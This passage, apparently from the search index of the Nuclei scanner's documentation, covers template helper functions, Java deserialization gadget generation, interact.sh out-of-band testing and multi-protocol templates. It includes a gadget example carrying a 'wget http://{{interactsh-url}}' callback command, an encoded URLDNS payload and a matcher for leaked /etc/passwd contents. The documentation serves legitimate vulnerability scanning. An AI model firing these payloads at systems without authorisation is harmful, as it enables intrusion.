rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54 generate_jwt(json, algorithm, signature, unixMaxAge) []byte Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm generate_jwt(\"{\\\"name\\\":\\\"John Doe\\\",\\\"foo\\\":\\\"bar\\\"}\", \"HS256\", \"hello-world\") eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U gzip(input string) string Compresses the input using GZip base64(gzip(\"Hello\")) +H4sIAAAAAAAA//JIzcnJBwQAAP//gonR9wUAAAA= gzip_decode(input string) string Decompresses the input using GZip gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\")) Hello hex_decode(input interface{}) []byte Hex decodes the given input hex_decode(\"6161\") aa hex_encode(input interface{}) string Hex encodes the given input hex_encode(\"aa\") 6161 hex_to_dec(hexNumber number | string) float64 Transforms the input hexadecimal number into decimal format hex_to_dec(\"ff\") hex_to_dec(\"0xff\") 255 hmac(algorithm, data, secret) string hmac function that accepts a hashing function type with data and secret hmac(\"sha1\", \"test\", \"scrt\") 8856b111056d946d5c6c92a21b43c233596623c6 html_escape(input interface{}) string HTML escapes the given input html_escape(\"<body>test</body>\") &lt;body&gt;test&lt;/body&gt; html_unescape(input interface{}) string HTML un-escapes the given input html_unescape(\"&lt;body&gt;test&lt;/body&gt;\") <body>test</body> index(stringOrSlice any, index int) string receive string or []string return the string of the index 1. index(split(\"www.example.com\", \".\"), 1) 2. index(\"www.example.com\",1) 1. example 2. w join(separator string, elements ...interface{}) string Joins the given elements using the specified separator join(\"_\", 123, \"hello\", \"world\") 123_hello_world json_minify(json) string Minifies a JSON string by removing unnecessary whitespace json_minify(\"{ \\\"name\\\": \\\"John Doe\\\", \\\"foo\\\": \\\"bar\\\" }\") {\"foo\":\"bar\",\"name\":\"John Doe\"} json_prettify(json) string Prettifies a JSON string by adding indentation json_prettify(\"{\\\"foo\\\":\\\"bar\\\",\\\"name\\\":\\\"John Doe\\\"}\") {\\n \\\"foo\\\": \\\"bar\\\",\\n \\\"name\\\": \\\"John Doe\\\"\\n} len(arg interface{}) int Returns the length of the input 1. len(\"Hello\") 2. len(split(\"www.example.com\",\".\")) 1. 5 2. 3 line_ends_with(str string, suffix ...string) bool Checks if any line of the string ends with any of the provided substrings line_ends_with(\"Hello\\nHi\", \"lo\") true line_starts_with(str string, prefix ...string) bool Checks if any line of the string starts with any of the provided substrings line_starts_with(\"Hi\\nHello\", \"He\") true md5(input interface{}) string Calculates the MD5 (Message Digest) hash of the input md5(\"Hello\") 8b1a9953c4611296a827abf8c47804d7 mmh3(input interface{}) string Calculates the MMH3 (MurmurHash3) hash of an input mmh3(\"Hello\") 316307400 oct_to_dec(octalNumber number | string) float64 Transforms the input octal number into a decimal format oct_to_dec(\"0o1234567\") oct_to_dec(1234567) 342391 print_debug(args ...interface{}) Prints the value of a given input or expression. Used for debugging. print_debug(1+2, \"Hello\") 3 Hello rand_base(length uint, optionalCharSet string) string Generates a random sequence of given length string from an optional charset (defaults to letters and numbers) rand_base(5, \"abc\") caccb rand_char(optionalCharSet string) string Generates a random character from an optional character set (defaults to letters and numbers) rand_char(\"abc\") a rand_int(optionalMin, optionalMax uint) int Generates a random integer between the given optional limits (defaults to 0 - MaxInt32) rand_int(1, 10) 6 rand_text_alpha(length uint, optionalBadChars string) string Generates a random string of letters, of given length, excluding the optional cutset characters rand_text_alpha(10, \"abc\") WKozhjJWlJ rand_text_alphanumeric(length uint, optionalBadChars string) string Generates a random alphanumeric string, of given length without the optional cutset characters rand_text_alphanumeric(10, \"ab12\") NthI0IiY8r rand_ip(cidr ...string) string Generates a random IP address rand_ip(\"192.168.0.0/24\") 192.168.0.171 rand_text_numeric(length uint, optionalBadNumbers string) string Generates a random numeric string of given length without the optional set of undesired numbers rand_text_numeric(10, 123) 0654087985 regex(pattern, input string) bool Tests the given regular expression against the input string regex(\"H([a-z]+)o\", \"Hello\") true remove_bad_chars(input, cutset interface{}) string Removes the desired characters from the input remove_bad_chars(\"abcd\", \"bc\") ad repeat(str string, count uint) string Repeats the input string the given amount of times repeat(\"../\", 5) ../../../../../ replace(str, old, new string) string Replaces a given substring in the given input replace(\"Hello\", \"He\", \"Ha\") Hallo replace_regex(source, regex, replacement string) string Replaces substrings matching the given regular expression in the input replace_regex(\"He123llo\", \"(\\\\d+)\", \"\") Hello reverse(input string) string Reverses the given input reverse(\"abc\") cba sha1(input interface{}) string Calculates the SHA1 (Secure Hash 1) hash of the input sha1(\"Hello\") f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0 sha256(input interface{}) string Calculates the SHA256 (Secure Hash 256) hash of the input sha256(\"Hello\") 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969 split(input string, n int) []string if split has 2 parameters and second is an int,It splits string as slice of string, and len of each string is n and last of them is no more than n split(\"abcdefg\", 2) [ab cd ef g] split(input string, separator string, optionalChunkSize) []string if split has 3 parameters or 2 parameters and second is string, It return a string slice where each substring is separated by the separator string and slice length no larger than optionalChunkSize. But if optionalChunkSize is negative, it's no limited and same as optionalChunkSize not set. 1. split(\"ab,cd,efg\", \",\", 2) 2. split(\"ab,cd,efg\", \",\", -1) 3. split(\"ab,cd,efg\", \",\") 1. [ab cdefg] 2. [ab cd efg] 3. [ab cd efg] starts_with(str string, prefix ...string) bool Checks if the string starts with any of the provided substrings starts_with(\"Hello\", \"He\") true to_lower(input string) string Transforms the input into lowercase characters to_lower(\"HELLO\") hello to_unix_time(input string, layout string) int Parses a string date time using default or user given layouts, then returns its Unix timestamp to_unix_time(\"2022-01-13T16:30:10+00:00\") to_unix_time(\"2022-01-13 16:30:10\") to_unix_time(\"13-01-2022 16:30:10\". \"02-01-2006 15:04:05\") 1642091410 to_upper(input string) string Transforms the input into uppercase characters to_upper(\"hello\") HELLO trim(input, cutset string) string Returns a slice of the input with all leading and trailing Unicode code points contained in cutset removed trim(\"aaaHelloddd\", \"ad\") Hello trim_left(input, cutset string) string Returns a slice of the input with all leading Unicode code points contained in cutset removed trim_left(\"aaaHelloddd\", \"ad\") Helloddd trim_prefix(input, prefix string) string Returns the input without the provided leading prefix string trim_prefix(\"aaHelloaa\", \"aa\") Helloaa trim_right(input, cutset string) string Returns a string, with all trailing Unicode code points contained in cutset removed trim_right(\"aaaHelloddd\", \"ad\") aaaHello trim_space(input string) string Returns a string, with all leading and trailing white space removed, as defined by Unicode trim_space(\" Hello \") \"Hello\" trim_suffix(input, suffix string) string Returns input without the provided trailing suffix string trim_suffix(\"aaHelloaa\", \"aa\") aaHello unix_time(optionalSeconds uint) float64 Returns the current Unix time (number of seconds elapsed since January 1, 1970 UTC) with the added optional seconds unix_time(10) 1639568278 url_decode(input string) string URL decodes the input string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") https://projectdiscovery.io?test=1 url_encode(input string) string URL encodes the input string url_encode(\"https://projectdiscovery.io/test?a=1\") https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1 wait_for(seconds uint) Pauses the execution for the given amount of seconds wait_for(10) true zlib(input string) string Compresses the input using Zlib base64(zlib(\"Hello\")) eJzySM3JyQcEAAD//wWMAfU= zlib_decode(input string) string Decompresses the input using Zlib zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\")) Hello resolve(host string, format string) string Resolves a host using a dns type that you define resolve(\"localhost\",4) 127.0.0.1 ip_format(ip string, format string) string It takes an input ip and converts it to another format according to this legend , the second parameter indicates the conversion index and must be between 1 and 11 ip_format(\"127.0.0.1\", 3) 0177.0.0.01 Deserialization helper functions \u00b6 Nuclei allows payload generation for a few common gadget from ysoserial . Supported Payload: dns (URLDNS) commons-collections3.1 commons-collections4.0 jdk7u21 jdk8u20 groovy1 Supported encodings: base64 (default) gzip-base64 gzip hex raw Deserialization helper function format: {{ generate_java_gadget(payload , cmd , encoding }} Deserialization helper function example: {{ generate_java_gadget(\"commons-collections3.1\" , \"wget http://{{interactsh-url}}\" , \"base64\" ) }} JSON helper functions \u00b6 Nuclei allows manipulate JSON strings in different ways, here is a list of its functions: generate_jwt , to generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm. json_minify , to minifies a JSON string by removing unnecessary whitespace. json_prettify , to prettifies a JSON string by adding indentation. Examples generate_jwt To generate a JSON Web Token (JWT), you have to supply the JSON that you want to sign, at least . Here is a list of supported algorithms for generating JWTs with generate_jwt function (case-insensitive) : HS256 HS384 HS512 RS256 RS384 RS512 PS256 PS384 PS512 ES256 ES384 ES512 EdDSA NONE Empty string (\"\") also means NONE . Format: {{ generate_jwt(json , algorithm , signature , maxAgeUnix) }} Arguments other than json are optional. Example: variables : json : | # required { \"foo\": \"bar\", \"name\": \"John Doe\" } alg : \"HS256\" # optional sig : \"this_is_secret\" # optional age : '{{to_unix_time(\"2032-12-30T16:30:10+00:00\")}}' # optional jwt : '{{generate_jwt(json, \"{{alg}}\", \"{{sig}}\", \"{{age}}\")}}' The maxAgeUnix argument is to set the expiration \"exp\" JWT standard claim, as well as the \"iat\" claim when you call the function. json_minify Format: {{ json_minify(json) }} Example: variables : json : | { \"foo\": \"bar\", \"name\": \"John Doe\" } minify : '{{json_minify(json}}' minify variable output: { \"foo\" : \"bar\" , \"name\" : \"John Doe\" } json_prettify Format: {{ json_prettify(json) }} Example: variables : json : '{\"foo\":\"bar\",\"name\":\"John Doe\"}' pretty : '{{json_prettify(json}}' pretty variable output: { \"foo\" : \"bar\" , \"name\" : \"John Doe\" } resolve Format: {{ resolve(host , format) }} Here is a list of formats available for dns type: 4 or a 6 or aaaa cname ns txt srv ptr mx soa caa","title":"Helper Functions"},{"location":"templating-guide/helper-functions/#helper-functions","text":"Here is the list of all supported helper functions can be used in the RAW requests / Network requests. Helper function Description Example Output aes_gcm(key, plaintext interface{}) []byte AES GCM encrypts a string with key {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4 base64(src interface{}) string Base64 encodes a string base64(\"Hello\") SGVsbG8= base64_decode(src interface{}) []byte Base64 decodes a string base64_decode(\"SGVsbG8=\") Hello base64_py(src interface{}) string Encodes string to base64 like python (with new lines) base64_py(\"Hello\") SGVsbG8=\\n bin_to_dec(binaryNumber number | string) float64 Transforms the input binary number into a decimal format bin_to_dec(\"0b1010\") bin_to_dec(1010) 10 compare_versions(versionToCheck string, constraints ...string) bool Compares the first version argument with the provided constraints compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1') true concat(arguments ...interface{}) string Concatenates the given number of arguments to form a string concat(\"Hello\", 123, \"world) Hello123world contains(input, substring interface{}) bool Verifies if a string contains a substring contains(\"Hello\", \"lo\") true contains_all(input interface{}, substrings ...string) bool Verifies if any input contains all of the substrings contains(\"Hello everyone\", \"lo\", \"every\") true contains_any(input interface{}, substrings ...string) bool Verifies if an input contains any of substrings contains(\"Hello everyone\", \"abc\", \"llo\") true date_time(dateTimeFormat string, optionalUnixTime interface{}) string Returns the formatted date time using simplified or go style layout for the current or the given unix time date_time(\"%Y-%M-%D %H:%m\") date_time(\"%Y-%M-%D %H:%m\", 1654870680) date_time(\"2006-01-02 15:04\", unix_time()) 2022-06-10 14:18 dec_to_hex(number number | string) string Transforms the input number into hexadecimal format dec_to_hex(7001)\" 1b59 ends_with(str string, suffix ...string) bool Checks if the string ends with any of the provided substrings ends_with(\"Hello\", \"lo\") true generate_java_gadget(gadget, cmd, encoding interface{}) string Generates a Java Deserialization Gadget generate_java_gadget(\"dns\", \"{{interactsh-url}}\", \"base64\") rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAFcHh0ACpjYWhnMmZiaW41NjRvMGJ0MHRzMDhycDdlZXBwYjkxNDUub2FzdC5mdW54 generate_jwt(json, algorithm, signature, unixMaxAge) []byte Generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm generate_jwt(\"{\\\"name\\\":\\\"John Doe\\\",\\\"foo\\\":\\\"bar\\\"}\", \"HS256\", \"hello-world\") eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U gzip(input string) string Compresses the input using GZip base64(gzip(\"Hello\")) +H4sIAAAAAAAA//JIzcnJBwQAAP//gonR9wUAAAA= gzip_decode(input string) string Decompresses the input using GZip gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\")) Hello hex_decode(input interface{}) []byte Hex decodes the given input hex_decode(\"6161\") aa hex_encode(input interface{}) string Hex encodes the given input hex_encode(\"aa\") 6161 hex_to_dec(hexNumber number | string) float64 Transforms the input hexadecimal number into decimal format hex_to_dec(\"ff\") hex_to_dec(\"0xff\") 255 hmac(algorithm, data, secret) string hmac function that accepts a hashing function type with data and secret hmac(\"sha1\", \"test\", \"scrt\") 8856b111056d946d5c6c92a21b43c233596623c6 html_escape(input interface{}) string HTML escapes the given input html_escape(\"<body>test</body>\") &lt;body&gt;test&lt;/body&gt; html_unescape(input interface{}) string HTML un-escapes the given input html_unescape(\"&lt;body&gt;test&lt;/body&gt;\") <body>test</body> index(stringOrSlice any, index int) string receive string or []string return the string of the index 1. index(split(\"www.example.com\", \".\"), 1) 2. index(\"www.example.com\",1) 1. example 2. w join(separator string, elements ...interface{}) string Joins the given elements using the specified separator join(\"_\", 123, \"hello\", \"world\") 123_hello_world json_minify(json) string Minifies a JSON string by removing unnecessary whitespace json_minify(\"{ \\\"name\\\": \\\"John Doe\\\", \\\"foo\\\": \\\"bar\\\" }\") {\"foo\":\"bar\",\"name\":\"John Doe\"} json_prettify(json) string Prettifies a JSON string by adding indentation json_prettify(\"{\\\"foo\\\":\\\"bar\\\",\\\"name\\\":\\\"John Doe\\\"}\") {\\n \\\"foo\\\": \\\"bar\\\",\\n \\\"name\\\": \\\"John Doe\\\"\\n} len(arg interface{}) int Returns the length of the input 1. len(\"Hello\") 2. len(split(\"www.example.com\",\".\")) 1. 5 2. 3 line_ends_with(str string, suffix ...string) bool Checks if any line of the string ends with any of the provided substrings line_ends_with(\"Hello\\nHi\", \"lo\") true line_starts_with(str string, prefix ...string) bool Checks if any line of the string starts with any of the provided substrings line_starts_with(\"Hi\\nHello\", \"He\") true md5(input interface{}) string Calculates the MD5 (Message Digest) hash of the input md5(\"Hello\") 8b1a9953c4611296a827abf8c47804d7 mmh3(input interface{}) string Calculates the MMH3 (MurmurHash3) hash of an input mmh3(\"Hello\") 316307400 oct_to_dec(octalNumber number | string) float64 Transforms the input octal number into a decimal format oct_to_dec(\"0o1234567\") oct_to_dec(1234567) 342391 print_debug(args ...interface{}) Prints the value of a given input or expression. Used for debugging. print_debug(1+2, \"Hello\") 3 Hello rand_base(length uint, optionalCharSet string) string Generates a random sequence of given length string from an optional charset (defaults to letters and numbers) rand_base(5, \"abc\") caccb rand_char(optionalCharSet string) string Generates a random character from an optional character set (defaults to letters and numbers) rand_char(\"abc\") a rand_int(optionalMin, optionalMax uint) int Generates a random integer between the given optional limits (defaults to 0 - MaxInt32) rand_int(1, 10) 6 rand_text_alpha(length uint, optionalBadChars string) string Generates a random string of letters, of given length, excluding the optional cutset characters rand_text_alpha(10, \"abc\") WKozhjJWlJ rand_text_alphanumeric(length uint, optionalBadChars string) string Generates a random alphanumeric string, of given length without the optional cutset characters rand_text_alphanumeric(10, \"ab12\") NthI0IiY8r rand_ip(cidr ...string) string Generates a random IP address rand_ip(\"192.168.0.0/24\") 192.168.0.171 rand_text_numeric(length uint, optionalBadNumbers string) string Generates a random numeric string of given length without the optional set of undesired numbers rand_text_numeric(10, 123) 0654087985 regex(pattern, input string) bool Tests the given regular expression against the input string regex(\"H([a-z]+)o\", \"Hello\") true remove_bad_chars(input, cutset interface{}) string Removes the desired characters from the input remove_bad_chars(\"abcd\", \"bc\") ad repeat(str string, count uint) string Repeats the input string the given amount of times repeat(\"../\", 5) ../../../../../ replace(str, old, new string) string Replaces a given substring in the given input replace(\"Hello\", \"He\", \"Ha\") Hallo replace_regex(source, regex, replacement string) string Replaces substrings matching the given regular expression in the input replace_regex(\"He123llo\", \"(\\\\d+)\", \"\") Hello reverse(input string) string Reverses the given input reverse(\"abc\") cba sha1(input interface{}) string Calculates the SHA1 (Secure Hash 1) hash of the input sha1(\"Hello\") f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0 sha256(input interface{}) string Calculates the SHA256 (Secure Hash 256) hash of the input sha256(\"Hello\") 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969 split(input string, n int) []string if split has 2 parameters and second is an int,It splits string as slice of string, and len of each string is n and last of them is no more than n split(\"abcdefg\", 2) [ab cd ef g] split(input string, separator string, optionalChunkSize) []string if split has 3 parameters or 2 parameters and second is string, It return a string slice where each substring is separated by the separator string and slice length no larger than optionalChunkSize. But if optionalChunkSize is negative, it's no limited and same as optionalChunkSize not set. 1. split(\"ab,cd,efg\", \",\", 2) 2. split(\"ab,cd,efg\", \",\", -1) 3. split(\"ab,cd,efg\", \",\") 1. [ab cdefg] 2. [ab cd efg] 3. [ab cd efg] starts_with(str string, prefix ...string) bool Checks if the string starts with any of the provided substrings starts_with(\"Hello\", \"He\") true to_lower(input string) string Transforms the input into lowercase characters to_lower(\"HELLO\") hello to_unix_time(input string, layout string) int Parses a string date time using default or user given layouts, then returns its Unix timestamp to_unix_time(\"2022-01-13T16:30:10+00:00\") to_unix_time(\"2022-01-13 16:30:10\") to_unix_time(\"13-01-2022 16:30:10\". \"02-01-2006 15:04:05\") 1642091410 to_upper(input string) string Transforms the input into uppercase characters to_upper(\"hello\") HELLO trim(input, cutset string) string Returns a slice of the input with all leading and trailing Unicode code points contained in cutset removed trim(\"aaaHelloddd\", \"ad\") Hello trim_left(input, cutset string) string Returns a slice of the input with all leading Unicode code points contained in cutset removed trim_left(\"aaaHelloddd\", \"ad\") Helloddd trim_prefix(input, prefix string) string Returns the input without the provided leading prefix string trim_prefix(\"aaHelloaa\", \"aa\") Helloaa trim_right(input, cutset string) string Returns a string, with all trailing Unicode code points contained in cutset removed trim_right(\"aaaHelloddd\", \"ad\") aaaHello trim_space(input string) string Returns a string, with all leading and trailing white space removed, as defined by Unicode trim_space(\" Hello \") \"Hello\" trim_suffix(input, suffix string) string Returns input without the provided trailing suffix string trim_suffix(\"aaHelloaa\", \"aa\") aaHello unix_time(optionalSeconds uint) float64 Returns the current Unix time (number of seconds elapsed since January 1, 1970 UTC) with the added optional seconds unix_time(10) 1639568278 url_decode(input string) string URL decodes the input string url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\") https://projectdiscovery.io?test=1 url_encode(input string) string URL encodes the input string url_encode(\"https://projectdiscovery.io/test?a=1\") https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1 wait_for(seconds uint) Pauses the execution for the given amount of seconds wait_for(10) true zlib(input string) string Compresses the input using Zlib base64(zlib(\"Hello\")) eJzySM3JyQcEAAD//wWMAfU= zlib_decode(input string) string Decompresses the input using Zlib zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\")) Hello resolve(host string, format string) string Resolves a host using a dns type that you define resolve(\"localhost\",4) 127.0.0.1 ip_format(ip string, format string) string It takes an input ip and converts it to another format according to this legend , the second parameter indicates the conversion index and must be between 1 and 11 ip_format(\"127.0.0.1\", 3) 0177.0.0.01","title":"Helper functions"},{"location":"templating-guide/helper-functions/#deserialization-helper-functions","text":"Nuclei allows payload generation for a few common gadget from ysoserial . Supported Payload: dns (URLDNS) commons-collections3.1 commons-collections4.0 jdk7u21 jdk8u20 groovy1 Supported encodings: base64 (default) gzip-base64 gzip hex raw Deserialization helper function format: {{ generate_java_gadget(payload , cmd , encoding }} Deserialization helper function example: {{ generate_java_gadget(\"commons-collections3.1\" , \"wget http://{{interactsh-url}}\" , \"base64\" ) }}","title":"Deserialization helper functions"},{"location":"templating-guide/helper-functions/#json-helper-functions","text":"Nuclei allows manipulate JSON strings in different ways, here is a list of its functions: generate_jwt , to generates a JSON Web Token (JWT) using the claims provided in a JSON string, the signature, and the specified algorithm. json_minify , to minifies a JSON string by removing unnecessary whitespace. json_prettify , to prettifies a JSON string by adding indentation. Examples generate_jwt To generate a JSON Web Token (JWT), you have to supply the JSON that you want to sign, at least . Here is a list of supported algorithms for generating JWTs with generate_jwt function (case-insensitive) : HS256 HS384 HS512 RS256 RS384 RS512 PS256 PS384 PS512 ES256 ES384 ES512 EdDSA NONE Empty string (\"\") also means NONE . Format: {{ generate_jwt(json , algorithm , signature , maxAgeUnix) }} Arguments other than json are optional. Example: variables : json : | # required { \"foo\": \"bar\", \"name\": \"John Doe\" } alg : \"HS256\" # optional sig : \"this_is_secret\" # optional age : '{{to_unix_time(\"2032-12-30T16:30:10+00:00\")}}' # optional jwt : '{{generate_jwt(json, \"{{alg}}\", \"{{sig}}\", \"{{age}}\")}}' The maxAgeUnix argument is to set the expiration \"exp\" JWT standard claim, as well as the \"iat\" claim when you call the function. json_minify Format: {{ json_minify(json) }} Example: variables : json : | { \"foo\": \"bar\", \"name\": \"John Doe\" } minify : '{{json_minify(json}}' minify variable output: { \"foo\" : \"bar\" , \"name\" : \"John Doe\" } json_prettify Format: {{ json_prettify(json) }} Example: variables : json : '{\"foo\":\"bar\",\"name\":\"John Doe\"}' pretty : '{{json_prettify(json}}' pretty variable output: { \"foo\" : \"bar\" , \"name\" : \"John Doe\" } resolve Format: {{ resolve(host , format) }} Here is a list of formats available for dns type: 4 or a 6 or aaaa cname ns txt srv ptr mx soa caa","title":"JSON helper functions"},{"location":"templating-guide/interactsh/","text":"Since release of Nuclei v2.3.6 , Nuclei supports using the interact.sh API to achieve OOB based vulnerability scanning with automatic Request correlation built in. It's as easy as writing {{interactsh-url}} anywhere in the request, and adding a matcher for interact_protocol . Nuclei will handle correlation of the interaction to the template & the request it was generated from allowing effortless OOB scanning. Interactsh Placeholder \u00b6 {{interactsh-url}} placeholder is supported in http and network requests. An example of nuclei request with {{interactsh-url}} placeholders is provided below. These are replaced on runtime with unique interact.sh URLs. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}} Interactsh Matchers \u00b6 Interactsh interactions can be used with word , regex or dsl matcher/extractor using following parts. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol Value can be dns, http or smtp. This is the standard matcher for every interactsh based template with DNS often as the common value as it is very non-intrusive in nature. interactsh_request The request that the interact.sh server received. interactsh_response The response that the interact.sh server sent to the client. Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Example of HTTP Interaction matcher + word matcher on Interaction content matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of /etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"OOB Testing"},{"location":"templating-guide/interactsh/#interactsh-placeholder","text":"{{interactsh-url}} placeholder is supported in http and network requests. An example of nuclei request with {{interactsh-url}} placeholders is provided below. These are replaced on runtime with unique interact.sh URLs. - raw : - | GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1 Host: {{Hostname}}","title":"Interactsh Placeholder"},{"location":"templating-guide/interactsh/#interactsh-matchers","text":"Interactsh interactions can be used with word , regex or dsl matcher/extractor using following parts. part interactsh_protocol interactsh_request interactsh_response interactsh_protocol Value can be dns, http or smtp. This is the standard matcher for every interactsh based template with DNS often as the common value as it is very non-intrusive in nature. interactsh_request The request that the interact.sh server received. interactsh_response The response that the interact.sh server sent to the client. Example of Interactsh DNS Interaction matcher: matchers : - type : word part : interactsh_protocol # Confirms the DNS Interaction words : - \"dns\" Example of HTTP Interaction matcher + word matcher on Interaction content matchers-condition : and matchers : - type : word part : interactsh_protocol # Confirms the HTTP Interaction words : - \"http\" - type : regex part : interactsh_request # Confirms the retrieval of /etc/passwd file regex : - \"root:[x*]:0:0:\"","title":"Interactsh Matchers"},{"location":"templating-guide/multiprotocol/","text":"Multi Protocol Execution (beta) \u00b6 Nuclei supports many protocol such as HTTP,DNS,Network etc and one can write nuclei template for a vulnerability in any of these protocols, but what if a vulnerability requires execution of multiple protocols in sync to test/exploit it. A classic example of this is Subdomain Takeovers where one needs to check for CNAME record of a subdomain and then check if the service is vulnerable to takeover or not. This was partially possible in nuclei with workflows but with Nuclei v3.0 it is now possible to easily write a Template that can execute multiple protocols in sync and then perform checks on the results of each protocol along with other improvements. Example \u00b6 id : dns-http-template info : name : dns + http takeover template author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname extractors : - type : dsl name : exported_cname dsl : - cname internal : true http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(body,'Domain not found') # check for http string - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response) condition : and As we can see in above example there is no new logic or syntax just write logic for each protocol and then use dynamic extractor to export that variable and it is shared across all protocols and we call this Template Context which contains all variables that are scoped at template Level. Features \u00b6 Features that make multi protocol execution powerful Export Data Using Dynamic Extractors Template Scoped Protocol Responses Shared Variables Across Protocols Export Data Using Dynamic Extractors \u00b6 If you are not familiar with dynamic extractors then please read dynamic extractor section first. Earlier Dynamic Extractors support was only available for specific protocol or Workflows but with multi protocol execution dynamic extracted values are stored in template context and can be used across all protocols. Example \u00b6 id : dns-http-template info : name : dns + http takeover template author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname extractors : - type : dsl name : exported_cname dsl : - cname internal : true http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(body,'Domain not found') # check for http string - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response) condition : and Template Scoped Protocol Responses \u00b6 In Previous example we saw how to export dns cname and use it in http request but what if there are more than 4 protocols in a template and we want to export subject_dn , ns , cname , all_headers and what not. this can be done just by adding more dynamic extractors but that will add lot of noise to template and redundant logic and at some point it will hard to track and maintain all those variables. To address this Multi protocol execution brings support for template scoped protocol responses i.e all response fields of all protocols in template are available in template context with protocol prefix. Ex: Protocol Response Field Exported Variable ssl subject_dn ssl_subject_dn dns ns dns_ns dns cname dns_cname http all_headers http_all_headers Note This is just a example but response fields of all protocols used in multi protocol template are exported Example \u00b6 id : dns-ssl-http-proto-prefix info : name : multi protocol request with response fields author : pdteam severity : info dns : - name : \"{{FQDN}}\" # DNS Request type : cname ssl : - address : \"{{Hostname}}\" # ssl request http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(http_body,'ProjectDiscovery.io') # check for http string - trim_suffix(dns_cname,'.ghost.io.') == 'projectdiscovery' # check for cname (extracted information from dns response) - ssl_subject_cn == 'blog.projectdiscovery.io' condition : and List all available response fields To list all exported response fields write a multi protocol template and run it with -debug -svd flag and it will print all exported response fields Ex: nuclei -t multi-protocol-template.yaml -u scanme.sh -debug -svd Shared Variables Across Protocols \u00b6 As we can tell now multi protocol execution brings lot of flexibility and power to write complex templates but there are some cases where logic requires some kind of preprocessing to variables before they are used, again this can be achieved by using variables and helper functions directly in request but that will make template ugly and unreadable and this is especially true with network templates. For example consider Apache Airflow <=1.10.10 - Command Injection which requires base64-encoding,decoding,concat,interactsh_urls and then payload is ready to use, if all this logic is implemented in protocol request itself then it will be hard to read and maintain i.e why we have variables , to reuse variables and make payloads readable and easy to maintain, it is also necessary for other cases where generated interactsh urls needs to be same across multiple requests/protocols etc. For this reason multi protocol execution supports variables and they are also scoped at template context and can be used across all protocols for preprocessing, payload building etc. Example \u00b6 id : dns-ssl-http-with-variables info : name : multi protocol request with variables author : pdteam severity : info variables : cname_filtered : '{{trim_suffix(dns_cname,\".ghost.io.\")}}' dns : - name : \"{{FQDN}}\" # DNS Request type : cname ssl : - address : \"{{Hostname}}\" # ssl request http : - method : GET # http request path : - \"{{BaseURL}}\" matchers : - type : dsl dsl : - contains(http_body,'ProjectDiscovery.io') # check for http string - cname_filtered == 'projectdiscovery' # check for cname (extracted information from dns response) - ssl_subject_cn == 'blog.projectdiscovery.io' condition : and The above template and previous one are same but in this case we are using variables to preprocess dns_cname and then use it in http request later on Note This is just a example of how variables can be used in 